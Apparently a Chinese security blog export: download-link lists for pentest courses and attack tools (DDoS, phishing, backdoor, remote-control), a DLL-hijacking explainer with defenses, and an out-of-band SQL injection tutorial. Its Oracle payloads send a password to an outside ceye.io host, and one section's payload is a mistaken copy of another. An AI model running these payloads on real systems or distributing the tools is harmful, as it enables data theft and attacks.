class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1DsVdxs3aOYQR0lL9csOU4A</span><br><span class="line">提取码：2tnp</span><br></pre></td></tr></table></figure><hr><h2 id="渗透资源合集"><a href="#渗透资源合集" class="headerlink" title="渗透资源合集"></a>渗透资源合集</h2><h3 id="WEB渗透工程师必看"><a href="#WEB渗透工程师必看" class="headerlink" title="WEB渗透工程师必看"></a>WEB渗透工程师必看</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">千锋网络安全全套视频</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1hCNJZv18ZDA5_3SBIxyg9w</span><br><span class="line">提取码：daf2</span><br><span class="line"></span><br><span class="line">SRC挖掘指南：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1vTpPaDNiTDs8UgTulfWylA</span><br><span class="line">提取码：tffk</span><br></pre></td></tr></table></figure><h3 id="ARM资料大全"><a href="#ARM资料大全" class="headerlink" title="ARM资料大全"></a>ARM资料大全</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1METTjhXCKVykyV-SNW0AYg</span><br><span class="line">提取码：2x9t</span><br></pre></td></tr></table></figure><h3 id="最全逆向综合书籍"><a href="#最全逆向综合书籍" class="headerlink" title="最全逆向综合书籍"></a>最全逆向综合书籍</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Yo2lmZcswJXLE_2pdgvkUg</span><br><span class="line">提取码：97pg</span><br></pre></td></tr></table></figure><h3 id="渗透综合书籍"><a href="#渗透综合书籍" class="headerlink" title="渗透综合书籍"></a>渗透综合书籍</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">高度安全环境下的渗透测试：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;15EMz-uCkZQQ-P-9pWldHeg</span><br><span class="line">提取码：xe35</span><br><span class="line"></span><br><span class="line">网络攻防实战研究-提权</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1_s8HZWytQR8_obSoiEjaxQ</span><br><span class="line">提取码：5umj</span><br></pre></td></tr></table></figure><h3 id="我爱kali，kali全套视频教学"><a href="#我爱kali，kali全套视频教学" class="headerlink" title="我爱kali，kali全套视频教学"></a>我爱kali，kali全套视频教学</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">全套学习资料：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1zNvowFfqB9oRd_P8PukKwg</span><br><span class="line">提取码：y9u3</span><br><span class="line"></span><br><span class="line">metasploit内网渗透指南</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1F4AwBD8Itd0IEh9ol_LsGg</span><br><span class="line">提取码：md1b</span><br><span class="line"></span><br><span class="line">从实践中学习kali全套资源</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1PN9KyFErMRbg2yMV29G5HQ</span><br><span class="line">提取码：kkj1</span><br></pre></td></tr></table></figure><h3 id="内网渗透书籍合集"><a href="#内网渗透书籍合集" class="headerlink" title="内网渗透书籍合集"></a>内网渗透书籍合集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf内网渗透：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;11MejsJs4lqLVPq-4A0hB_A</span><br><span class="line">提取码：e1jj</span><br></pre></td></tr></table></figure><h3 id="WEB渗透视频合集"><a href="#WEB渗透视频合集" class="headerlink" title="WEB渗透视频合集"></a>WEB渗透视频合集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">小迪渗透专栏：</span><br><span class="line">2018-2019</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1rHsxEtQbXuvNlWA6nm-tdg</span><br><span class="line">提取码：tn7o    </span><br><span class="line">2019</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1CrO4luPuuAUYnNEJvFiTPA</span><br><span class="line">提取码：h155        </span><br><span class="line">2012</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Q-2Xfcu2fWc0rAYBuBUlRw</span><br><span class="line">提取码：zt85</span><br><span class="line">2014-2015后续</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1D6diGpXRDCtkuON_8zGAEA</span><br><span class="line">提取码：ow48</span><br><span class="line">2014免费对外讲</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1a3wtBPKJI92QjvriFQ3wwA</span><br><span class="line">提取码：a4tb        </span><br><span class="line">2015WEB渗透高级篇</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1PjNyb-dTSZ8l81tfbBudPg</span><br><span class="line">提取码：lsg1        </span><br><span class="line">2015全新WEB渗透测试</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1jnHdfSixXxQcGwO-Yc5jwA</span><br><span class="line">提取码：f28x</span><br><span class="line">渗透测试培训第6期</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Aw5XF_xBMbM8jgjc_3MkgA</span><br><span class="line">提取码：drda        </span><br><span class="line">渗透测试培训第7期</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1_vlGHld6piM1O9BvJL_SGw</span><br><span class="line">提取码：tgyj             </span><br><span class="line">渗透测试培训第5期</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1YHjGMGfNseejAzBmeEw4iw</span><br><span class="line">提取码：0935</span><br><span class="line"></span><br><span class="line">实战WEB渗透：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1rlTLc4yujmbmUyThzYDz6g</span><br><span class="line">提取码：crom                       </span><br><span class="line">        </span><br><span class="line">暗月渗透精品：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1a1_vNQOrdzbBdVDUeM4o2g</span><br><span class="line">提取码：mczl</span><br><span class="line">   </span><br><span class="line">2013年饭客大型职业入侵渗透培训班：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1FscgnGob4k5VhqxNJDkUIQ</span><br><span class="line">提取码：ldyk</span><br><span class="line">            </span><br><span class="line">2014年大型实战网站入侵：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1QT3av6azDqR6UFlsncvqhg</span><br><span class="line">提取码：de7w</span><br><span class="line"></span><br><span class="line">白帽子高端信息安全教程：        </span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;17sGIygCyaADC0Gje2zmHpg</span><br><span class="line">提取码：fx1j</span><br><span class="line"></span><br><span class="line">WEB安全基础：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1vaHcvq2jgsspuUFlc3mYDg</span><br><span class="line">提取码：yj34</span><br><span class="line"></span><br><span class="line">网络安全全套视频：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1G34aN7G1tnXGKVZ4uYukHg</span><br><span class="line">提取码：lxum</span><br></pre></td></tr></table></figure><hr><h2 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h2><h3 id="PWN专用虚拟机"><a href="#PWN专用虚拟机" class="headerlink" title="PWN专用虚拟机"></a>PWN专用虚拟机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Ubentu16专用虚拟机：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1s69aOXxi38uW9mp_x9RsNA</span><br><span class="line">提取码：ilzs</span><br><span class="line"></span><br><span class="line">linux64位pwn专用虚拟机：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Q7xQ48o3D95euhPRkXoq2A</span><br><span class="line">提取码：fy3q</span><br></pre></td></tr></table></figure><h3 id="漏洞扫描工具"><a href="#漏洞扫描工具" class="headerlink" title="漏洞扫描工具"></a>漏洞扫描工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AWVS-13</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1A5rMPqpFhhkPdzDUMhHwcQ</span><br><span class="line">提取码：ufad</span><br><span class="line"></span><br><span class="line">APPSCAN8.7</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;17fJ0IEv9leX4_lpRSAuX6w</span><br><span class="line">提取码：1brz</span><br><span class="line"></span><br><span class="line">AWVS12</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1N9JCr8B6WIgBwTtIvbOWNw</span><br><span class="line">提取码：bw4x</span><br></pre></td></tr></table></figure><h3 id="杂项工具集合"><a href="#杂项工具集合" class="headerlink" title="杂项工具集合"></a>杂项工具集合</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">ddos攻击软件工具：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;17VwuGArtA-MQRNC4Yj9kXw</span><br><span class="line">提取码：tuxr</span><br><span class="line"></span><br><span class="line">钓鱼工具：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1axawbvMmSEaWCLAVpCYdOg</span><br><span class="line">提取码：ebyu</span><br><span class="line"></span><br><span class="line">端口扫描工具：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1nFprLyFkuDtoi4NFhl2HKA</span><br><span class="line">提取码：uohn</span><br><span class="line"></span><br><span class="line">加壳工具：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1LMmHxBmHq0DqEFHLnPxBzw</span><br><span class="line">提取码：udt4</span><br><span class="line"></span><br><span class="line">虚拟机工具：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1ZWsAeIzrMYsxKS6G9wAJ4g</span><br><span class="line">提取码：uc1c</span><br><span class="line"></span><br><span class="line">远程控制工具：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1CugNPycxYgW8Pw_OdSa7qw</span><br><span class="line">提取码：kted</span><br><span class="line"></span><br><span class="line">qq软件工具：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1ComhHBtCgKA4i9YRprH90g</span><br><span class="line">提取码：td7o</span><br><span class="line"></span><br><span class="line">超级字典工具：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1NqQLKCWX1XQCVGFQ4AHh7g</span><br><span class="line">提取码：c0we</span><br><span class="line"></span><br><span class="line">后门工具：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1YhUnX6D_-ZCn6ZL2sZYUEw</span><br><span class="line">提取码：2x3f</span><br><span class="line"></span><br><span class="line">数据包嗅探工具：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1UxrQlBr-GBAI1cLK8IVoeA</span><br><span class="line">提取码：wn7z</span><br><span class="line"></span><br><span class="line">其他工具：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1UgKFrJf4C4BXdI9yPlpkWA</span><br><span class="line">提取码：hwly</span><br></pre></td></tr></table></figure><h3 id="shell管理器"><a href="#shell管理器" class="headerlink" title="shell管理器"></a>shell管理器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">功夫再高也怕菜刀：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Z5BFRkUQvRup0Je3hv3iUQ</span><br><span class="line">提取码：jcpw</span><br></pre></td></tr></table></figure><h3 id="CTF工具包"><a href="#CTF工具包" class="headerlink" title="CTF工具包"></a>CTF工具包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;11Cid17J5Dl1nR2PqGl8YUg </span><br><span class="line">提取码：ej45 </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习资料 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是DLL劫持</title>
      <link href="2020/10/19/%E4%BB%80%E4%B9%88%E6%98%AFDLL%E5%8A%AB%E6%8C%81/"/>
      <url>2020/10/19/%E4%BB%80%E4%B9%88%E6%98%AFDLL%E5%8A%AB%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<p>Windows在其基础体系结构中具有DLL的搜索路径（加载DLL文件要遵循目录查找优先级）。如果你可以找出没有绝对路径的可执行文件请求的DLL（触发此搜索过程），则可以将攻击代码的DLL放置在搜索路径的更高位置，以便在实际版本之前找到它，并且Windows会毫不犹豫将攻击代码提供给应用程序。<br>让我们假设Windows的DLL搜索路径如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A目录：&lt;-可执行文件的当前工作目录，最高优先级，首先检查</span><br><span class="line">B目录：\Windows</span><br><span class="line">C目录：\ Windows \ system32</span><br><span class="line">D目录：\ Windows \ syswow64 &lt;-最低优先级，最后检查</span><br></pre></td></tr></table></figure><p>这时候，可执行文件“ Foo.exe”请求加载“ bar.dll”，该文件恰好位于syswow64（D）子目录中。这使您有机会将恶意版本放置在A目录，B目录或C目录中，并将其加载到可执行文件中。<br>如前所述，即使您可以用自己的版本替换DLL，即使是绝对的完整路径也无法防止这种情况。<br>Microsoft Windows使用Windows文件保护机制来保护System32之类的系统路径，但是在企业解决方案中保护可执行文件免受DLL劫持的最佳方法是：</p><blockquote><p>使用绝对路径而不是相对路径<br>如果您有个人签名，请在将DLL加载到内存之前对DLL文件签名并检查应用程序中的签名。否则请使用原始DLL哈希检查DLL文件的哈希）<br>当然，这也不是仅限于Windows。从理论上讲，任何允许动态链接外部库的OS都容易受到攻击。</p></blockquote><p>查找丢失可以加载的缺少DLL的好工具：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https : &#x2F;&#x2F;processhacker.sourceforge.io&#x2F;</span><br></pre></td></tr></table></figure><p>学习资源/链接以了解DLL劫持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;resources.infosecinstitute.com&#x2F;d...revisited&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;pentestlab.blog&#x2F;2017&#x2F;03&#x2F;27&#x2F;dll-hijacking&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;liberty-shell.com&#x2F;sec&#x2F;2019&#x2F;03&#x2F;12&#x2F;dll-hijacking&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;astr0baby.wordpress.com&#x2F;2018&#x2F;09&#x2F;...ing-works&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.sans.org&#x2F;cyber-security-summ...862085.pdf</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;posts.specterops.io&#x2F;lateral-move...f61e8ab992</span><br></pre></td></tr></table></figure><p>还建议此线程有关Windows特权升级。讲座也涵盖了一些基础知识：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https : &#x2F;&#x2F;greysec.net&#x2F;showthread.php?tid&#x3D;</span><br></pre></td></tr></table></figure><p>用于发现可能的DLL利用的工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cys3c&#x2F;Siofra [ https:&#x2F;&#x2F;github.com&#x2F;Cybereason&#x2F;siofra ]</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cyberark&#x2F;DLLSpy</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;MojtabaTajik&#x2F;Robber</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DLL劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库DNSLog外带注入-总结</title>
      <link href="2020/10/19/%E6%95%B0%E6%8D%AE%E5%BA%93DNSLog%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5-%E6%80%BB%E7%BB%93/"/>
      <url>2020/10/19/%E6%95%B0%E6%8D%AE%E5%BA%93DNSLog%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5-%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p><strong>sql注入中利用的骚姿势你又知道几个？</strong></p><h1 id="DNSLog外带注入和DNSlog带外注入？（OOB）"><a href="#DNSLog外带注入和DNSlog带外注入？（OOB）" class="headerlink" title="DNSLog外带注入和DNSlog带外注入？（OOB）"></a>DNSLog外带注入和DNSlog带外注入？（OOB）</h1><p>其实是一样的，叫法不同！本人还是习惯叫外带注入，自我感觉，比较顺口</p><h1 id="为什么需要外带注入？"><a href="#为什么需要外带注入？" class="headerlink" title="为什么需要外带注入？"></a>为什么需要外带注入？</h1><p>当我们对一个数据库进行注入时，无回显，且无法进行时间注入，那么就可以利用一个通道，把查询到数据通过通道带出去，这里的通道包括：http请求、DNS解析、SMB服务等将数据带出。</p><p>of course！这里主讲DNSlog外带注入</p><h1 id="mysql-DNSlog外带注入："><a href="#mysql-DNSlog外带注入：" class="headerlink" title="mysql-DNSlog外带注入："></a>mysql-DNSlog外带注入：</h1><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.mysql.ini中secure_file_priv必须为空。(PS：修改mysql.ini文件，在[mysqld]下加入secure_file_priv=)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql 新版本下secure-file-priv字段 ：secure-file-priv参数是用来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的。</span><br><span class="line">当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</span><br><span class="line">当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</span><br><span class="line">当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</span><br></pre></td></tr></table></figure><p>2.从payload看出load_file的路径是windows下的UNC路径，所以mysql带外注入只能发生在windows机器上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器, UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机.</span><br><span class="line"></span><br><span class="line">UNC命名语法</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">UNC命名使用特定的标记法来识别网络资源. UNC命名由三个部分组成- 服务器名, 共享名, 和一个可选的文件路径. 这三个部分通过backslash连接起来, 如下:</span><br><span class="line"></span><br><span class="line">\\server\share\file_path</span><br><span class="line"></span><br><span class="line">这里的server部分引用的是由DNS或者WINS网络服务维护的字符串. 服务器名是由system administrator设定的.</span><br><span class="line"></span><br><span class="line">share部分引用了由系统管理员创建的一个label. 在绝大多数版本的windows中, 比如说, 共享名admin$指的是操作系统安装的根路径(通常是C:\WINNT 或 C:\WINDOWS).</span><br><span class="line"></span><br><span class="line">file部分引用在共享点之下的本地子文件夹.</span><br><span class="line"></span><br><span class="line">UNC命名实例：</span><br><span class="line">\\teela\admin$ (to reach C:\WINNT)</span><br><span class="line">\\teela\admin$\system32 (to reach C:\WINNT\system32)</span><br><span class="line">\\teela\temp (to reach C:\temp)</span><br><span class="line"> </span><br><span class="line">通过使用Windows Exlorer或者DOM命令行, 再加上恰当的安全证明, 你可以通过指定UNC名字来映射网络驱动器, 远程地访问一台计算机上的文件夹.</span><br><span class="line"></span><br><span class="line">参考文章：https:&#x2F;&#x2F;www.lifewire.com&#x2F;unc-universal-naming-convention-818230</span><br></pre></td></tr></table></figure><h4 id="接受DNS请求的DNSlog平台"><a href="#接受DNS请求的DNSlog平台" class="headerlink" title="接受DNS请求的DNSlog平台"></a>接受DNS请求的DNSlog平台</h4><blockquote><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a><br><a href="http://ceye.io/">http://ceye.io</a></p></blockquote><p>也可以自己手动搭建</p><blockquote><p>工具地址：<br><a href="https://github.com/bugscanteam/dnslog/">https://github.com/bugscanteam/dnslog/</a></p></blockquote><h4 id="本地环境复现"><a href="#本地环境复现" class="headerlink" title="本地环境复现"></a>本地环境复现</h4><p>在ceye.io申请一个账号</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/357021509.png"></p><p>本地mysql查询，带入查询的数据包版本信息：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1331594550.png"></p><p>这里稍微解释一下，concat()是把各种字符串组合起来，满足UNC命名规则</p><p>这里成功收到DNS请求查询记录：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3221848381.png"></p><h6 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h6><p>这里的\转义之后为<br>查询的数据如果有特殊符号可以进行编码，如hex()<br>unc有长度限制，长度不能超过128</p><h1 id="oracle-DNSlog外带注入："><a href="#oracle-DNSlog外带注入：" class="headerlink" title="oracle-DNSlog外带注入："></a>oracle-DNSlog外带注入：</h1><h2 id="四种可以利用函数："><a href="#四种可以利用函数：" class="headerlink" title="四种可以利用函数："></a>四种可以利用函数：</h2><h4 id="UTL-HTTP-REQUEST函数"><a href="#UTL-HTTP-REQUEST函数" class="headerlink" title="UTL_HTTP.REQUEST函数"></a>UTL_HTTP.REQUEST函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from test_user where id &#x3D;1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id&#x3D;1)||&#39;.mdk941.ceye.io&#39;) FROM sys.DUAL;</span><br></pre></td></tr></table></figure><h4 id="DBMS-LDAP-INIT函数"><a href="#DBMS-LDAP-INIT函数" class="headerlink" title="DBMS_LDAP.INIT函数"></a>DBMS_LDAP.INIT函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from test_user where id &#x3D;1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id&#x3D;1)||&#39;.mdk941.ceye.io&#39;,80) FROM sys.DUAL;</span><br></pre></td></tr></table></figure><h4 id="HTTPURITYPE函数"><a href="#HTTPURITYPE函数" class="headerlink" title="HTTPURITYPE函数"></a>HTTPURITYPE函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from test_user where id &#x3D;1 union SELECT HTTPURITYPE((select pass from test_user where id&#x3D;1)||&#39;.mdk941.ceye.io&#39;).GETCLOB() FROM sys.DUAL;</span><br></pre></td></tr></table></figure><h4 id="UTL-INADDR-GET-HOST-ADDRESS函数"><a href="#UTL-INADDR-GET-HOST-ADDRESS函数" class="headerlink" title="UTL_INADDR.GET_HOST_ADDRESS函数"></a>UTL_INADDR.GET_HOST_ADDRESS函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from test_user where id &#x3D;1 union SELECT HTTPURITYPE((select pass from test_user where id&#x3D;1)||&#39;.mdk941.ceye.io&#39;).GETCLOB() FROM sys.DUAL;</span><br></pre></td></tr></table></figure><h6 id="注意：-1"><a href="#注意：-1" class="headerlink" title="注意："></a>注意：</h6><p>||在oracle中并不是运算符，而是起到字符拼接的作用</p><h1 id="MSSQL-DNSLog外带注入："><a href="#MSSQL-DNSLog外带注入：" 